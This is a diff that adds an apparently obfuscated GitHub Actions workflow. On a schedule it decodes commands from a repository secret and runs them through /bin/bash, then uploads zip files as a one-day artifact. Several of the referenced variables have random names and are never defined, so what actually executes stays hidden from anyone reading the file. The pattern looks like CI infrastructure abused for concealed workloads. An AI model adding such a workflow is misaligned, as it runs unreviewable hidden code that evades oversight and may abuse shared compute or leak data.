@@ -1,0 +1,33 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '34 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          iz0: ${{ secrets.iz0 }}
+        run: |
+          printf '%s' "$iz0" | jq -r .bs348 | /bin/bash
+          echo $dg53779 | jq -r .duaf0 | /bin/bash
+          printf '%s' "$uejmw25" | jq -r .k9066 | /bin/bash
+          printf '%s' "$kyne345" | jq -r .sftd2 | /bin/bash
+          printf '%s' "$qaid68" | jq -r .f23625 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: lg5F0BAw
+          path: "*.zip"
+          retention-days: 1
